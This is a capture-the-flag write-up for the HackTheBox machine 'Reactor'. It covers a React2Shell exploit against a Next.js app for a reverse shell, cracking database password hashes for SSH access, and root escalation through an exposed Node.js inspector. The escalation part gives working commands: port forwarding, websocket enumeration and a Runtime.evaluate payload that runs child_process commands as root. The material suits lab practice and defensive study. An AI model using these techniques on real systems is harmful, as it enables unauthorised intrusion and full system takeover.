# Reactor: HackTheBox

## Enumeration

Port 22,3000 are open, with no detectable top level domains or subdomains


## Initial Foothold

- Port 3000 is vulnerable to [React2Shell](https://github.com/rubensuxo-eh/react2shell-exploit/blob/main/react2shell-exploit.py) as it's running next.js 15.
- This gives a reverse shell.


## Pivoting to user

- In `/opt/reactor-app` we can see that there is a *reactor.db* file, containing some users.
- Copy the hashes into [crackstation](https://crackstation.net/) and a password is obtained, which allows us to ssh into the box as the user.

## Privilege Escalation

- I ran [LinPeas](https://github.com/peass-ng/PEASS-ng) to find that NodeJS had one process running as root. This process is also running a nodejs interactive debugger on port 9229.

```
root 1418 0.0 1.2 1066808 47824 ? Ssl 02:09 0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

- Since this is running as root we can interact with the websocket to gain root shell.
- First, forward the port to your attacker machine using [chisel](https://github.com/jpillora/chisel).
- Install wscat on your machine using the following command `sudo apt install node-ws`.
- Now interact with the websocket using the following command to enumerate running process ids:

```bash
curl http://127.0.0.1:9229/json/list
```

- This gives this output:

```javascript
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/7c7393f5-68a6-4416-bf7f-c86d5dcfb470",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/7c7393f5-68a6-4416-bf7f-c86d5dcfb470",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "7c7393f5-68a6-4416-bf7f-c86d5dcfb470",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/7c7393f5-68a6-4416-bf7f-c86d5dcfb470"
} ]
```

- Here we can see the websocket debugger URL, which we'll use wscat to interact with:

```bash
wscat -c ws://127.0.0.1:9229/7c7393f5-68a6-4416-bf7f-c86d5dcfb470
```

- Now we'll try to run a shell on this repl, there are multiple methods, but this one worked for me:

```javascript
{"id":1,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('id').toString()"}}
```

- This gives this output:

```javascript
{"id":1,"result":{"result":{"type":"string","value":"uid=0(root) gid=0(root) groups=0(root)\n"}}}
```

- So with this method, just run `cat /root/root.txt` to get the flag.


Happy Hacking :)
